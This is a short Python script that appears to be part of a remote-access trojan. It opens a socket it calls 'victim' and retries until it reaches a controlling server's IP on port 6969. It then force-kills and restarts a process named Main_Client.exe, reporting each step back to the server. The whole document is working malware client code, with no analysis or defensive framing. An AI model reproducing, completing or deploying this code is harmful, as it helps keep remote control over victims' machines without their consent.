import socket
import os
from Main_Client import ip_server

while True:
    try:
        victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        victim.connect((ip_server, 6969))
        result = "all good"

        break
    except Exception as e:
        result = f"Error: {e}"

try:
    os.system('taskkill /f /im Main_Client.exe')
    victim.send("process finished".encode())
except Exception as e:
    result = f"Error: {e}"
    victim.send(result.encode())

try:
    os.system('Main_Client.exe')
    victim.send("process restarted".encode())
except Exception as e:
    result = f"Error: {e}"
    victim.send(result.encode())

victim.close()
